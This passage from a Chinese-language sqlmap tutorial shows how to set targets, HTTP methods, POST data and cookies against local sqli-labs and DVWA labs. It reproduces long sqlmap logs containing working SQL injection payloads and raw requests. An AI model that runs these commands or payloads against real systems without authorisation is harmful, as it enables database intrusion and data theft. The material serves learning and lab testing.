                                                                                                                                                                                                                                                                                                                                                                                                                                                               
1234567891011121314151617
```

此过程较快，是因为有缓存，直接读取本地缓存。
（4）从配置文件sqlmap.conf中读取目标探测，参数是 **-c**。

进行测试：

```shell
python sqlmap.py -c sqlmap.conf
1
```

打印

```shell
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.2.31#dev}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[19:27:10] [CRITICAL] missing a mandatory option in the configuration file (direct, url, logFile, bulkFile, googleDork, requestFile or wizard)
                                                                                                                                                                                                                                                                                                                                                                                                                                                               
123456789
```

提示缺少参数，此时在sqlmap目录下的sqlmap.conf中加入参数：

> \# Target URL.
> \# Example: http://192.168.1.121/sqlmap/mysql/get_int.php?id=1&cat=2
> url = http://127.0.0.1/sqli-labs/Less-2/?id=3

并保存再次测试得到结果：

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___[(]_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . [)]     | .'| . |                                                                                                                                 
|___|_  [(]_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 19:29:50 /2020-02-25/                                                                                                                      
                                                                                                                                                          
[19:29:50] [INFO] testing connection to the target URL                                                                                                    
[19:29:50] [INFO] checking if the target is protected by some kind of WAF/IPS                                                                             
[19:29:50] [INFO] testing if the target URL content is stable                                                                                             
[19:29:51] [INFO] target URL content is stable                                                                                                            
[19:29:51] [INFO] testing if GET parameter 'id' is dynamic                                                                                                
[19:29:51] [INFO] GET parameter 'id' appears to be dynamic                                                                                                
[19:29:51] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')                                       
[19:29:51] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks                            
[19:29:51] [INFO] testing for SQL injection on GET parameter 'id'                                                                                         
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]                                            
                                                                                                                                                          
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]                             
                                                                                                                                                          
[19:29:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                                              
[19:29:56] [WARNING] reflective value(s) found and filtering out                                                                                          
[19:29:56] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")                   
[19:29:56] [INFO] testing 'Generic inline queries'                                                                                                        
[19:29:56] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                   
[19:29:56] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'                                                        
[19:29:56] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                               
[19:29:56] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'                                                                    
[19:29:56] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                       
[19:29:56] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'                                                            
[19:29:56] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                             
[19:29:56] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable                    
[19:29:56] [INFO] testing 'MySQL inline queries'                                                                                                          
[19:29:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'                                                                                     
[19:29:56] [WARNING] time-based comparison requires larger statistical model, please wait............. (done)                                             
[19:29:57] [INFO] testing 'MySQL >= 5.0.12 stacked queries'                                                                                               
[19:29:57] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'                                                                       
[19:29:57] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'                                                                                 
[19:29:57] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'                                                                        
[19:29:57] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'                                                                                  
[19:29:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                                                                            
[19:30:07] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable                                        
[19:30:07] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'                                                                                  
[19:30:07] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found     
[19:30:07] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically e
xtending the range for current UNION query injection technique test                                                                                       
[19:30:07] [INFO] target URL appears to have 3 columns in query                                                                                           
[19:30:07] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable                                                         
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]                                                                  
                                                                                                                                                          
sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:                                                                   
---                                                                                                                                                       
Parameter: id (GET)                                                                                                                                       
    Type: boolean-based blind                                                                                                                             
    Title: AND boolean-based blind - WHERE or HAVING clause                                                                                               
    Payload: id=3 AND 2331=2331                                                                                                                           
                                                                                                                                                          
    Type: error-based                                                                                                                                     
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)                                                              
    Payload: id=3 AND (SELECT 7999 FROM(SELECT COUNT(*),CONCAT(0x7162786a71,(SELECT (ELT(7999=7999,1))),0x7178717671,FLOOR(RAND(0)*2))x FROM INFORMATION_S
CHEMA.PLUGINS GROUP BY x)a)                                                                                                                               
                                                                                                                                                          
    Type: time-based blind                                                                                                                                
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                                                                             
    Payload: id=3 AND (SELECT 3727 FROM (SELECT(SLEEP(5)))RGAJ)                                                                                           
                                                                                                                                                          
    Type: UNION query                                                                                                                                     
    Title: Generic UNION query (NULL) - 3 columns                                                                                                         
    Payload: id=-8029 UNION ALL SELECT NULL,CONCAT(0x7162786a71,0x79644646714470516f6d4342496d65754f547961586b55726f6f6f454e4452467659575362594d58,0x71787
17671),NULL-- -                                                                                                                                           
---                                                                                                                                                       
[19:30:15] [INFO] the back-end DBMS is MySQL                                                                                                              
[19:30:16] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'                          
back-end DBMS: MySQL >= 5.0                                                                                                                               
[19:30:16] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'                                         
                                                                                                                                                          
[*] ending @ 19:30:16 /2020-02-25/                                                                                                                        
                                                                                                                                                          
                                                                                                                                                          
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384
```

此时是对目标url进行探测。

## 二、sqlmap设置请求参数(上)

HTTP请求有很多种方法（method），可以在不同位置（GET、POST、cookie和User-Agent等）携带不同参数。往往只有在特定位置携带了特定参数以特定方法发起的请求才是合法有效的请求。
Sqlmap运行时除了需要指定目标，有时还需要指定HTTP请求的一些细节。

### 1.HTTP方法

一般来说，Sqlmap能自动判断出是使用GET方法还是POST方法，但在某些情况下需要的可能是**PUT**等很少见的方法，此时就需要用参数 **–method**来指定方法。

进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-2/?id=3 --banner -v 5 --method='put'
1
```

打印

```shell
        ___                                                                                                                                              
       __H__                                                                                                                                             
 ___ ___[']_____ ___ ___  {1.4.2.31#dev}                                                                                                                 
|_ -| . [']     | .'| . |                                                                                                                                
|___|_  [.]_|_|_|__,|  _|                                                                                                                                
      |_|V...       |_|   http://sqlmap.org                                                                                                              
                                                                                                                                                         
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appl
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program              
                                                                                                                                                         
[*] starting @ 19:36:18 /2020-02-25/                                                                                                                     
                                                                                                                                                         
[19:36:18] [DEBUG] cleaning up configuration parameters                                                                                                  
[19:36:18] [DEBUG] setting the HTTP timeout                                                                                                              
[19:36:18] [DEBUG] setting the HTTP User-Agent header                                                                                                    
[19:36:18] [DEBUG] creating HTTP requests opener object                                                                                                  
[19:36:18] [INFO] resuming back-end DBMS 'mysql'                                                                                                         
[19:36:18] [INFO] testing connection to the target URL                                                                                                   
[19:36:18] [TRAFFIC OUT] HTTP request [#1]:                                                                                                              
'PUT' /sqli-labs/Less-2/?id=3 HTTP/1.1                                                                                                                   
Cache-control: no-cache                                                                                                                                  
User-agent: sqlmap/1.4.2.31#dev (http://sqlmap.org)                                                                                                      
Host: 127.0.0.1                                                                                                                                          
Accept: */*                                                                                                                                              
Accept-encoding: gzip,deflate                                                                                                                            
Connection: close                                                                                                                                        
                                                                                                                                                         
[19:36:18] [DEBUG] declared web page charset 'utf-8'                                                                                                     
[19:36:18] [TRAFFIC IN] HTTP response [#1] (200 OK):                                                                                                     
Date: Tue, 25 Feb 2020 11:36:18 GMT                                                                                                                      
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a                                                                                            
X-Powered-By: PHP/7.3.4                                                                                                                                  
Connection: close                                                                                                                                        
Transfer-Encoding: chunked                                                                                                                               
Content-Type: text/html; charset=UTF-8                                                                                                                   
URI: http://127.0.0.1:80/sqli-labs/Less-2/?id=3                                                                                                          
sqlmap resumed the following injection point(s) from stored session:                                                                                     
---                                                                                                                                                      
Parameter: id ('PUT')                                                                                                                                    
    Type: boolean-based blind                                                                                                                            
    Title: AND boolean-based blind - WHERE or HAVING clause                                                                                              
    Payload: id=3 AND 2331=2331                                                                                                                          
    Vector: AND [INFERENCE]                                                                                                                              
                                                                                                                                                         
    Type: error-based                                                                                                                                    
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)                                                             
    Payload: id=3 AND (SELECT 7999 FROM(SELECT COUNT(*),CONCAT(0x7162786a71,(SELECT (ELT(7999=7999,1))),0x7178717671,FLOOR(RAND(0)*2))x FROM INFORMATION_
CHEMA.PLUGINS GROUP BY x)a)                                                                                                                              
    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA
PLUGINS GROUP BY x)a)                                                                                                                                    
                                                                                                                                                         
    Type: time-based blind                                                                                                                               
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                                                                            
    Payload: id=3 AND (SELECT 3727 FROM (SELECT(SLEEP(5)))RGAJ)                                                                                          
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])                                            
                                                                                                                                                         
    Type: UNION query                                                                                                                                    
    Title: Generic UNION query (NULL) - 3 columns                                                                                                        
    Payload: id=-8029 UNION ALL SELECT NULL,CONCAT(0x7162786a71,0x79644646714470516f6d4342496d65754f547961586b55726f6f6f454e4452467659575362594d58,0x7178
17671),NULL-- -                                                                                                                                          
    Vector:  UNION ALL SELECT NULL,[QUERY],NULL-- -                                                                                                      
---                                                                                                                                                      
[19:36:18] [INFO] the back-end DBMS is MySQL                                                                                                             
[19:36:18] [INFO] fetching banner                                                                                                                        
[19:36:18] [DEBUG] resuming configuration option 'string' ('Your')                                                                                       
[19:36:18] [PAYLOAD] -5438 UNION ALL SELECT NULL,CONCAT(0x7162786a71,IFNULL(CAST(VERSION() AS NCHAR),0x20),0x7178717671),NULL-- -                        
[19:36:18] [TRAFFIC OUT] HTTP request [#2]:                                                                                                              
'PUT' /sqli-labs/Less-2/?id=-5438%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7162786a71%2CIFNULL%28CAST%28VERSION%28%29%20AS%20NCHAR%29%2C0x20%29%2C0x717
717671%29%2CNULL--%20- HTTP/1.1                                                                                                                          
Cache-control: no-cache                                                                                                                                  
User-agent: sqlmap/1.4.2.31#dev (http://sqlmap.org)                                                                                                      
Host: 127.0.0.1                                                                                                                                          
Accept: */*                                                                                                                                              
Accept-encoding: gzip,deflate                                                                                                                            
Connection: close                                                                                                                                        
                                                                                                                                                         
[19:36:18] [TRAFFIC IN] HTTP response [#2] (200 OK):                                                                                                     
Date: Tue, 25 Feb 2020 11:36:18 GMT                                                                                                                      
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a                                                                                            
X-Powered-By: PHP/7.3.4                                                                                                                                  
Connection: close                                                                                                                                        
Transfer-Encoding: chunked                                                                                                                               
Content-Type: text/html; charset=UTF-8                                                                                                                   
URI: http://127.0.0.1:80/sqli-labs/Less-2/?id=-5438%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7162786a71%2CIFNULL%28CAST%28VERSION%28%29%20AS%20NCHAR%29
2C0x20%29%2C0x7178717671%29%2CNULL--%20-                                                                                                                 
[19:36:18] [DEBUG] performed 1 queries in 0.05 seconds                                                                                                   
back-end DBMS: MySQL >= 5.0                                                                                                                              
banner: '5.7.26'                                                                                                                                         
[19:36:18] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'                                        
                                                                                                                                                         
[*] ending @ 19:36:18 /2020-02-25/                                                                                                                       
                                                                                                                                                         
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293
```

显然请求方法由默认方法get变为put。
大多数情况不需要指定请求方法。

### 2.sqlmap设置post提交参数

参数：
**–data= "xxx"**

默认情况下，用于执行HTTP请求的HTTP方法是GET，但是可以通过提供在POST请求中发送的数据隐式的将其改为POST。这些数据作为参数，被用于SQL注入检测。
通过以下方法获取要传入的参数：
![post参数](https://img-blog.csdnimg.cn/20200227121449756.gif#pic_center)
得到参数如下：
uname=admin&passwd=admin&submit=Submit
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-11/index.php --data="uname=admin&passwd=admin&submit=Submit" --banner
1
```

打印

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___[,]_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . ["]     | .'| . |                                                                                                                                 
|___|_  [']_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 20:15:58 /2020-02-25/                                                                                                                      
                                                                                                                                                          
[20:15:59] [INFO] testing connection to the target URL                                                                                                    
[20:15:59] [INFO] testing if the target URL content is stable                                                                                             
[20:15:59] [INFO] target URL content is stable                                                                                                            
[20:15:59] [INFO] testing if POST parameter 'uname' is dynamic                                                                                            
[20:15:59] [INFO] POST parameter 'uname' appears to be dynamic                                                                                            
[20:15:59] [INFO] heuristic (basic) test shows that POST parameter 'uname' might be injectable (possible DBMS: 'MySQL')                                   
[20:15:59] [INFO] heuristic (XSS) test shows that POST parameter 'uname' might be vulnerable to cross-site scripting (XSS) attacks                        
[20:15:59] [INFO] testing for SQL injection on POST parameter 'uname'                                                                                     
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]                                            
                                                                                                                                                          
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]                             
                                                                                                                                                          
[20:16:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                                              
[20:16:04] [WARNING] reflective value(s) found and filtering out                                                                                          
[20:16:04] [INFO] POST parameter 'uname' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")               
[20:16:04] [INFO] testing 'Generic inline queries'                                                                                                        
[20:16:04] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                   
[20:16:04] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'                                                        
[20:16:04] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                               
[20:16:04] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'                                                                    
[20:16:04] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                       
[20:16:04] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'                                                            
[20:16:04] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                             
[20:16:04] [INFO] POST parameter 'uname' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable                
[20:16:04] [INFO] testing 'MySQL inline queries'                                                                                                          
[20:16:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'                                                                                     
[20:16:04] [WARNING] time-based comparison requires larger statistical model, please wait............. (done)                                             
[20:16:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries'                                                                                               
[20:16:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'                                                                       
[20:16:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'                                                                                 
[20:16:05] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'                                                                        
[20:16:05] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'                                                                                  
[20:16:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                                                                            
[20:16:15] [INFO] POST parameter 'uname' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable                                    
[20:16:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'                                                                                  
[20:16:15] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found     
[20:16:15] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically e
xtending the range for current UNION query injection technique test                                                                                       
[20:16:15] [INFO] target URL appears to have 2 columns in query                                                                                           
[20:16:15] [INFO] POST parameter 'uname' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable                                                     
POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N]                                                              
                                                                                                                                                          
sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:                                                                   
---                                                                                                                                                       
Parameter: uname (POST)                                                                                                                                   
    Type: boolean-based blind                                                                                                                             
    Title: AND boolean-based blind - WHERE or HAVING clause                                                                                               
    Payload: uname=admin' AND 7492=7492 AND 'jXXH'='jXXH&passwd=admin&submit=Submit                                                                       
                                                                                                                                                          
    Type: error-based                                                                                                                                     
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)                                                              
    Payload: uname=admin' AND (SELECT 7837 FROM(SELECT COUNT(*),CONCAT(0x717a767a71,(SELECT (ELT(7837=7837,1))),0x717a7a7671,FLOOR(RAND(0)*2))x FROM INFOR
MATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'dtOn'='dtOn&passwd=admin&submit=Submit                                                                           
                                                                                                                                                          
    Type: time-based blind                                                                                                                                
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                                                                             
    Payload: uname=admin' AND (SELECT 7860 FROM (SELECT(SLEEP(5)))PVMp) AND 'CrTc'='CrTc&passwd=admin&submit=Submit                                       
                                                                                                                                                          
    Type: UNION query                                                                                                                                     
    Title: Generic UNION query (NULL) - 2 columns                                                                                                         
    Payload: uname=-9136' UNION ALL SELECT CONCAT(0x717a767a71,0x725a43566f6467534565694971667541727953454651634263597178416a6871516d64595a6e5052,0x717a7a
7671),NULL-- -&passwd=admin&submit=Submit                                                                                                                 
---                                                                                                                                                       
[20:16:21] [INFO] the back-end DBMS is MySQL                                                                                                              
[20:16:21] [INFO] fetching banner                                                                                                                         
[20:16:21] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'                          
back-end DBMS: MySQL >= 5.0                                                                                                                               
banner: '5.7.26'                                                                                                                                          
[20:16:21] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'                                         
                                                                                                                                                          
[*] ending @ 20:16:21 /2020-02-25/                                                                                                                        
                                                                                                                                                          
                                                                                                                                                          
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485
```

### 3.sqlmap中设置cookie参数

常用参数：

> –cookie
> –cookie-del
> –load-cookies
> –drop-set-cookie

#### 使用场景一：

web应用程序具有基于cookie验证的过程，要测试的页面只有在登录状态下才能访问，登录状态用cookie识别，即利用cookie登录网站。
登录dvwa进行配置如下：
![dvwa配置](https://img-blog.csdnimg.cn/20200227121614830.gif#pic_center)
得到测试链接：
http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#。
不带cookie进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-11/index.php --data="uname=admin&passwd=admin&submit=Submit" --banner
1
```

打印

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___[,]_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . [)]     | .'| . |                                                                                                                                 
|___|_  [']_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 20:32:53 /2020-02-25/                                                                                                                      
                                                                                                                                                          
[20:32:54] [INFO] testing connection to the target URL                                                                                                    
got a 302 redirect to 'http://127.0.0.1:80/dvwa/login.php'. Do you want to follow? [Y/n]                                                                  
                                                                                                                                                          
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=mo0id4fpa3u...k9jc45seke;security=impossible;security=impossible'). Do you 
want to use those [Y/n]                                                                                                                                   
                                                                                                                                                          
[20:33:02] [INFO] checking if the target is protected by some kind of WAF/IPS                                                                             
[20:33:02] [INFO] testing if the target URL content is stable                                                                                             
[20:33:02] [WARNING] GET parameter 'id' does not appear to be dynamic                                                                                     
[20:33:02] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable                                                         
[20:33:02] [INFO] testing for SQL injection on GET parameter 'id'                                                                                         
[20:33:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                                              
[20:33:04] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                      
[20:33:04] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                             
[20:33:05] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'                                                                           
[20:33:05] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                                     
[20:33:05] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'                                                                     
[20:33:06] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'                                                                          
[20:33:06] [INFO] testing 'Generic inline queries'                                                                                                        
[20:33:06] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'                                                                                    
[20:33:06] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'                                                                         
[20:33:07] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'                                                                  
[20:33:07] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                                                                            
[20:33:08] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'                                                                                         
[20:33:08] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'                                                                             
[20:33:08] [INFO] testing 'Oracle AND time-based blind'                                                                                                   
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of re
quests? [Y/n]                                                                                                                                             
                                                                                                                                                          
[20:33:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'                                                                                  
[20:33:13] [WARNING] GET parameter 'id' does not seem to be injectable                                                                                    
[20:33:13] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform m
ore tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper
=space2comment') and/or switch '--random-agent'                                                                                                           
                                                                                                                                                          
[*] ending @ 20:33:13 /2020-02-25/                                                                                                                        
                                                                                                                                                          
'Submit' 不是内部或外部命令，也不是可运行的程序                                                                                                                              
或批处理文件。                                                                                                                                                   
                                                                                                                                                                                                                                                                                                                   
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152
```

显然未达到预期效果，需要加上cookie。
获取cookie如下：

> security=low; csrftoken=gdhsRRG8COXmUmcoRBvbc259rYnbPKXFpEiggOHQF9MZxMkmBsX8zavVCyuWB7oF; PHPSESSID=e0c8pbo1jmiji6fjb5gl5e0nug

再次测试：

```shell
python sqlmap.py -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; csrftoken=gdhsRRG8COXmUmcoRBvbc259rYnbPKX FpEiggOHQF9MZxMkmBsX8zavVCyuWB7oF; PHPSESSID=e0c8pbo1jmiji6fjb5gl5e0nug" --banner --dbs
1
```

打印

```shell
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:05:46 /2020-02-26/

Cookie parameter 'csrftoken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N]

[18:05:52] [INFO] testing connection to the target URL
[18:05:52] [INFO] testing if the target URL content is stable
[18:05:52] [INFO] target URL content is stable
[18:05:52] [INFO] testing if GET parameter 'id' is dynamic
[18:05:52] [WARNING] GET parameter 'id' does not appear to be dynamic
[18:05:52] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[18:05:53] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[18:05:53] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[18:05:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:05:56] [WARNING] reflective value(s) found and filtering out
[18:05:57] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:05:57] [INFO] testing 'Generic inline queries'
[18:05:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:05:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:06:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:06:03] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --not-string="Me")
[18:06:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[18:06:03] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[18:06:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[18:06:03] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[18:06:03] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[18:06:03] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[18:06:03] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:06:03] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[18:06:03] [INFO] testing 'MySQL inline queries'
[18:06:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[18:06:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[18:06:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
